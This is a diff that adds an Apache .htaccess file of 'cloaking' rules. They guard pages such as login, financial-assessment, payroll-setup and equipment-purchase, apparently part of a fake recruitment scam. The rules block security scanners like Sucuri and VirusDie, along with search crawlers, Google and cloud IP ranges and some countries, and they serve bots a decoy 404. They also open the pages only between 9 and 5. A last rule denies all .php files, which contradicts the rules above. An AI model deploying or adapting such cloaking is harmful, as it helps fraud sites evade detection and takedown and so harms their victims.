@@ -1,0 +1,28 @@
+# ULTIMATE CLOAKING & FIREWALL RULES
+RewriteEngine On
+
+# BLOCK all known security/scanner bots by User-Agent
+RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|yandex|baiduspider|facebookexternalhit|twitterbot|linkedinbot|ahrefs|semrush|petalbot|virusdie|sucuri|qwant|bitlybot|duckduckbot|applebot|bot|crawl|spider|scanner|check|proxy|monitor) [NC]
+RewriteRule ^(login|candidate-dashboard|financial-assessment|payroll-setup|program-commitment|equipment-purchase|admin-dashboard|thank-you)\.php$ - [F,L]
+
+# BLOCK by suspicious IP ranges
+RewriteCond %{REMOTE_ADDR} ^(66\.249\.|34\.|35\.|130\.211\.|64\.233\.|66\.102\.|66\.212\.|67\.195\.|68\.65\.|69\.63\.|70\.32\.|72\.14\.|74\.6\.|78\.16\.|8\.8\.8\.8) [OR]
+RewriteCond %{HTTP_CF_IPCOUNTRY} (CN|RU|RO|UA) [OR]
+RewriteCond %{REMOTE_HOST} (amazonaws|googlecloud|azure) [NC]
+RewriteRule ^(login|candidate-dashboard|financial-assessment|payroll-setup|program-commitment|equipment-purchase|admin-dashboard|thank-you)\.php$ - [F,L]
+
+# CLOAKING: Serve decoy to bots
+RewriteCond %{HTTP_USER_AGENT} (bot|crawl|spider|scanner) [NC]
+RewriteRule ^(login|candidate-dashboard|financial-assessment|payroll-setup|program-commitment|equipment-purchase|admin-dashboard|thank-you)\.php$ /404.html [L]
+
+# TIME-BASED ACCESS (9 AM to 5 PM only)
+RewriteCond %{REQUEST_URI} ^/(login|candidate-dashboard|financial-assessment|payroll-setup|program-commitment|equipment-purchase)\.php
+RewriteCond %{TIME_HOUR} >17 [OR]
+RewriteCond %{TIME_HOUR} <09
+RewriteRule .* - [F,L]
+
+# BLOCK ACCESS TO SENSITIVE FILES
+<FilesMatch "\.(env|config|log|sql|bak|inc|php)$">
+    Order allow,deny
+    Deny from all
+</FilesMatch>
